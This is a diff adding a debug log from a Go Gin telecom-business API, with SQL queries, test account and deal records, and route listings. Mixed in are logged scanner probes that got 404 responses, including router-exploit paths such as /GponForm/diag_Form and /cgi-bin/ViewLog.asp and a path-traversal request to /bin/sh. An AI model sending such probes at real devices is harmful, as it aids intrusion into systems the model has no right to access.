+[GIN] 2020/01/01 - 17:57:15 | 404 |       5.718µs |   47.104.210.65 | POST     /cgi-bin/ViewLog.asp
+
+[35m(/root/go/src/upc.edu.cn/telecom_business/telecom_business_api/dal/db/base.go:41)[0m 
+[33m[2020-01-01 18:42:26][0m  [36;1m[26.78ms][0m  SELECT * FROM [accounts]   ORDER BY [id] OFFSET 0 ROWS FETCH NEXT 20 ROWS ONLY  
+[36;31m[9 rows affected or returned ][0m 
+time="2020-01-01T18:42:26+08:00" level=info msg="suc resp" data="[{{1 2019-12-30 09:51:23.997 +0000 UTC 2019-12-30 09:51:23.997 +0000 UTC} Wilson  0 0 Champs-Elysees  } {{6 2019-12-30 11:13:44.323 +0000 UTC 2019-12-30 11:35:59.51 +0000 UTC} 122455  0 0 test  } {{7 2019-12-30 13:40:25.773 +0000 UTC 2019-12-30 13:40:25.773 +0000 UTC} 1444552  0 0 aasfwawaf  } {{8 2019-12-31 14:42:23.333 +0000 UTC 2019-12-31 14:42:23.333 +0000 UTC} 133952 xl 1 20 20191230-tl-2  desc} {{15 2019-12-31 14:50:35.647 +0000 UTC 2019-12-31 14:50:35.647 +0000 UTC}   1 0   } {{28 2019-12-31 15:10:32.227 +0000 UTC 2019-12-31 15:10:32.227 +0000 UTC} 133456 lx 1 0 20191230-tl-1  test 0123} {{29 2019-12-31 15:25:40.527 +0000 UTC 2019-12-31 15:25:40.527 +0000 UTC} 1123 ?? 1 0 20191230-tl-1  desc} {{30 2019-12-31 15:32:56.387 +0000 UTC 2019-12-31 15:32:56.387 +0000 UTC} 1237899 植物 1 0 20191230-tl-1  desc} {{31 2019-12-31 15:36:44.443 +0000 UTC 2019-12-31 15:36:44.443 +0000 UTC} 789456 的发放 1 56.13 20191230-tl-1  aeq}]"
+[GIN] 2020/01/01 - 18:42:26 | 200 |   27.160422ms |   123.168.74.35 | POST     /api/account/list
+
+[35m(/root/go/src/upc.edu.cn/telecom_business/telecom_business_api/dal/db/base.go:41)[0m 
+[33m[2020-01-01 18:42:30][0m  [36;1m[25.44ms][0m  SELECT * FROM [deals]   ORDER BY [id] OFFSET 0 ROWS FETCH NEXT 20 ROWS ONLY  
+[36;31m[1 rows affected or returned ][0m 
+time="2020-01-01T18:42:30+08:00" level=info msg="suc resp" data="[{{1 2019-12-30 15:35:02.463 +0000 UTC 2019-12-30 15:35:02.463 +0000 UTC} 1577690826 asf 000011 0 11.25}]"
+[GIN] 2020/01/01 - 18:42:30 | 200 |   25.597082ms |   123.168.74.35 | POST     /api/deal/list
+[GIN] 2020/01/01 - 18:49:15 | 404 |      10.879µs |     36.90.25.84 | GET      /
+[GIN] 2020/01/01 - 19:22:29 | 404 |       5.786µs |     37.6.38.190 | GET      /
+[GIN] 2020/01/01 - 19:25:35 | 404 |       5.555µs | 183.193.234.138 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 19:49:48 | 404 |       5.946µs |  101.251.238.50 | GET      /
+[GIN] 2020/01/01 - 20:02:00 | 404 |       4.758µs | 183.192.248.225 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 20:59:32 | 404 |       3.954µs |   59.150.105.11 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 21:10:49 | 404 |       5.006µs |   178.128.179.4 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 22:13:48 | 404 |       5.738µs | 183.193.234.170 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 22:31:00 | 404 |       5.004µs |   5.160.151.123 | GET      /
+[GIN] 2020/01/01 - 22:31:45 | 404 |       8.473µs |   47.100.111.30 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 22:49:54 | 404 |       3.866µs |   47.100.111.30 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/02 - 00:19:28 | 404 |       3.776µs |  178.128.97.104 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/02 - 00:33:33 | 404 |      15.919µs | 223.244.236.232 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/02 - 00:45:20 | 404 |        5.43µs |   59.126.206.88 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/02 - 00:47:24 | 404 |        5.53µs |   59.150.105.11 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/02 - 01:25:23 | 404 |        4.01µs |  178.128.97.104 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/02 - 01:25:25 | 404 |       4.928µs |  178.128.97.104 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/02 - 01:32:03 | 404 |       3.891µs |   59.150.105.11 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/02 - 01:33:07 | 404 |       5.077µs |   122.228.19.80 | GET      /weborg/
+[GIN] 2020/01/02 - 02:07:54 | 404 |       5.159µs | 125.128.122.221 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/02 - 02:12:04 | 404 |       4.054µs |  123.200.31.130 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/02 - 03:00:48 | 404 |       4.428µs |   47.100.111.30 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/02 - 03:22:06 | 404 |       4.275µs |   49.83.196.158 | POST     /GponForm/diag_Form?images/
+[GIN] 2020/01/02 - 03:58:37 | 404 |       4.062µs |   194.79.20.247 | GET      /
+[GIN] 2020/01/02 - 05:23:26 | 404 |       5.347µs |  220.81.146.123 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/02 - 05:41:20 | 404 |       3.666µs |     5.101.0.209 | POST     /../../../../bin/sh
+[GIN] 2020/01/02 - 06:05:56 | 404 |       3.906µs |  115.159.203.90 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/02 - 06:57:21 | 404 |      55.378µs |   185.132.53.18 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/02 - 06:58:29 | 404 |       4.253µs |   104.152.52.25 | GET      /
+[GIN] 2020/01/02 - 07:42:42 | 404 |       4.701µs |   37.49.231.143 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/02 - 07:52:01 | 404 |       6.031µs | 187.188.142.207 | POST     /cgi-bin/ViewLog.asp
+
+[35m(/root/go/src/upc.edu.cn/telecom_business/telecom_business_api/dal/db/base.go:41)[0m 
+[33m[2020-01-02 08:11:43][0m  [36;1m[26.30ms][0m  SELECT * FROM [deals]   ORDER BY [id] OFFSET 0 ROWS FETCH NEXT 20 ROWS ONLY  
+[36;31m[1 rows affected or returned ][0m 
+time="2020-01-02T08:11:43+08:00" level=info msg="suc resp" data="[{{1 2019-12-30 15:35:02.463 +0000 UTC 2019-12-30 15:35:02.463 +0000 UTC} 1577690826 asf 000011 0 11.25}]"
+[GIN] 2020/01/02 - 08:11:43 | 200 |   26.602366ms |  123.168.74.221 | POST     /api/deal/list
+
+[35m(/root/go/src/upc.edu.cn/telecom_business/telecom_business_api/dal/db/base.go:41)[0m 
+[33m[2020-01-02 08:11:46][0m  [36;1m[25.84ms][0m  SELECT * FROM [accounts]   ORDER BY [id] OFFSET 0 ROWS FETCH NEXT 20 ROWS ONLY  
+[36;31m[9 rows affected or returned ][0m 
+time="2020-01-02T08:11:46+08:00" level=info msg="suc resp" data="[{{1 2019-12-30 09:51:23.997 +0000 UTC 2019-12-30 09:51:23.997 +0000 UTC} Wilson  0 0 Champs-Elysees  } {{6 2019-12-30 11:13:44.323 +0000 UTC 2019-12-30 11:35:59.51 +0000 UTC} 122455  0 0 test  } {{7 2019-12-30 13:40:25.773 +0000 UTC 2019-12-30 13:40:25.773 +0000 UTC} 1444552  0 0 aasfwawaf  } {{8 2019-12-31 14:42:23.333 +0000 UTC 2019-12-31 14:42:23.333 +0000 UTC} 133952 xl 1 20 20191230-tl-2  desc} {{15 2019-12-31 14:50:35.647 +0000 UTC 2019-12-31 14:50:35.647 +0000 UTC}   1 0   } {{28 2019-12-31 15:10:32.227 +0000 UTC 2019-12-31 15:10:32.227 +0000 UTC} 133456 lx 1 0 20191230-tl-1  test 0123} {{29 2019-12-31 15:25:40.527 +0000 UTC 2019-12-31 15:25:40.527 +0000 UTC} 1123 ?? 1 0 20191230-tl-1  desc} {{30 2019-12-31 15:32:56.387 +0000 UTC 2019-12-31 15:32:56.387 +0000 UTC} 1237899 植物 1 0 20191230-tl-1  desc} {{31 2019-12-31 15:36:44.443 +0000 UTC 2019-12-31 15:36:44.443 +0000 UTC} 789456 的发放 1 56.13 20191230-tl-1  aeq}]"
+[GIN] 2020/01/02 - 08:11:46 | 200 |   26.156607ms |  123.168.74.221 | POST     /api/account/list
+
+[35m(/root/go/src/upc.edu.cn/telecom_business/telecom_business_api/dal/db/base.go:41)[0m 
+[33m[2020-01-02 08:14:56][0m  [36;1m[26.10ms][0m  SELECT * FROM [accounts]   ORDER BY [id] OFFSET 0 ROWS FETCH NEXT 20 ROWS ONLY  
+[36;31m[9 rows affected or returned ][0m 
+time="2020-01-02T08:14:56+08:00" level=info msg="suc resp" data="[{{1 2019-12-30 09:51:23.997 +0000 UTC 2019-12-30 09:51:23.997 +0000 UTC} Wilson  0 0 Champs-Elysees  } {{6 2019-12-30 11:13:44.323 +0000 UTC 2019-12-30 11:35:59.51 +0000 UTC} 122455  0 0 test  } {{7 2019-12-30 13:40:25.773 +0000 UTC 2019-12-30 13:40:25.773 +0000 UTC} 1444552  0 0 aasfwawaf  } {{8 2019-12-31 14:42:23.333 +0000 UTC 2019-12-31 14:42:23.333 +0000 UTC} 133952 xl 1 20 20191230-tl-2  desc} {{15 2019-12-31 14:50:35.647 +0000 UTC 2019-12-31 14:50:35.647 +0000 UTC}   1 0   } {{28 2019-12-31 15:10:32.227 +0000 UTC 2019-12-31 15:10:32.227 +0000 UTC} 133456 lx 1 0 20191230-tl-1  test 0123} {{29 2019-12-31 15:25:40.527 +0000 UTC 2019-12-31 15:25:40.527 +0000 UTC} 1123 ?? 1 0 20191230-tl-1  desc} {{30 2019-12-31 15:32:56.387 +0000 UTC 2019-12-31 15:32:56.387 +0000 UTC} 1237899 植物 1 0 20191230-tl-1  desc} {{31 2019-12-31 15:36:44.443 +0000 UTC 2019-12-31 15:36:44.443 +0000 UTC} 789456 的发放 1 56.13 20191230-tl-1  aeq}]"
+[GIN] 2020/01/02 - 08:14:56 | 200 |   26.512318ms |  123.168.74.221 | POST     /api/account/list
+[GIN-debug] [WARNING] Creating an Engine instance with the Logger and Recovery middleware already attached.
+
+[GIN-debug] [WARNING] Running in "debug" mode. Switch to "release" mode in production.
+ - using env:	export GIN_MODE=release
+ - using code:	gin.SetMode(gin.ReleaseMode)
+
+[GIN-debug] GET    /api/account/change_balance --> upc.edu.cn/telecom_business/telecom_business_api/view.UpdateAccountBalance (4 handlers)
+[GIN-debug] POST   /api/account/change_balance --> upc.edu.cn/telecom_business/telecom_business_api/view.UpdateAccountBalance (4 handlers)
+[GIN-debug] GET    /api/account/use_balance  --> upc.edu.cn/telecom_business/telecom_business_api/view.UseAccountBalance (4 handlers)
+[GIN-debug] POST   /api/account/use_balance  --> upc.edu.cn/telecom_business/telecom_business_api/view.UseAccountBalance (4 handlers)
+[GIN-debug] GET    /api/package/update       --> upc.edu.cn/telecom_business/telecom_business_api/view.UpdatePackage (4 handlers)
+[GIN-debug] POST   /api/package/update       --> upc.edu.cn/telecom_business/telecom_business_api/view.UpdatePackage (4 handlers)
+[GIN-debug] GET    /api/account/list         --> upc.edu.cn/telecom_business/telecom_business_api/view.ListAccount (4 handlers)
+[GIN-debug] POST   /api/account/list         --> upc.edu.cn/telecom_business/telecom_business_api/view.ListAccount (4 handlers)
+[GIN-debug] GET    /api/employee/update      --> upc.edu.cn/telecom_business/telecom_business_api/view.UpdateEmployee (4 handlers)
+[GIN-debug] POST   /api/employee/update      --> upc.edu.cn/telecom_business/telecom_business_api/view.UpdateEmployee (4 handlers)
+[GIN-debug] GET    /api/employee/list        --> upc.edu.cn/telecom_business/telecom_business_api/view.ListEmployee (4 handlers)
+[GIN-debug] POST   /api/employee/list        --> upc.edu.cn/telecom_business/telecom_business_api/view.ListEmployee (4 handlers)
+[GIN-debug] GET    /api/employee/login       --> upc.edu.cn/telecom_business/telecom_business_api/view.LoginEmployee (4 handlers)
+[GIN-debug] POST   /api/employee/login       --> upc.edu.cn/telecom_business/telecom_business_api/view.LoginEmployee (4 handlers)
+[GIN-debug] GET    /api/account/update       --> upc.edu.cn/telecom_business/telecom_business_api/view.UpdateAccount (4 handlers)
+[GIN-debug] POST   /api/account/update       --> upc.edu.cn/telecom_business/telecom_business_api/view.UpdateAccount (4 handlers)
+[GIN-debug] GET    /api/account/delete       --> upc.edu.cn/telecom_business/telecom_business_api/view.DeleteAccount (4 handlers)
+[GIN-debug] POST   /api/account/delete       --> upc.edu.cn/telecom_business/telecom_business_api/view.DeleteAccount (4 handlers)
+[GIN-debug] GET    /api/deal/list            --> upc.edu.cn/telecom_business/telecom_business_api/view.ListDeal (4 handlers)
+[GIN-debug] POST   /api/deal/list            --> upc.edu.cn/telecom_business/telecom_business_api/view.ListDeal (4 handlers)
+[GIN-debug] GET    /api/deal/daily           --> upc.edu.cn/telecom_business/telecom_business_api/view.DailyDeals (4 handlers)
+[GIN-debug] POST   /api/deal/daily           --> upc.edu.cn/telecom_business/telecom_business_api/view.DailyDeals (4 handlers)
+[GIN-debug] GET    /api/deal/user            --> upc.edu.cn/telecom_business/telecom_business_api/view.UserDailyDeals (4 handlers)
+[GIN-debug] POST   /api/deal/user            --> upc.edu.cn/telecom_business/telecom_business_api/view.UserDailyDeals (4 handlers)
+[GIN-debug] GET    /api/deal/update          --> upc.edu.cn/telecom_business/telecom_business_api/view.UpdateDeal (4 handlers)
+[GIN-debug] POST   /api/deal/update          --> upc.edu.cn/telecom_business/telecom_business_api/view.UpdateDeal (4 handlers)
+[GIN-debug] GET    /api/deal/month           --> upc.edu.cn/telecom_business/telecom_business_api/view.MonthlyDeals (4 handlers)
+[GIN-debug] POST   /api/deal/month           --> upc.edu.cn/telecom_business/telecom_business_api/view.MonthlyDeals (4 handlers)
+[GIN-debug] GET    /api/package/list         --> upc.edu.cn/telecom_business/telecom_business_api/view.ListPackage (4 handlers)
+[GIN-debug] POST   /api/package/list         --> upc.edu.cn/telecom_business/telecom_business_api/view.ListPackage (4 handlers)
+[GIN-debug] Environment variable PORT is undefined. Using port :8080 by default
+[GIN-debug] Listening and serving HTTP on :8080
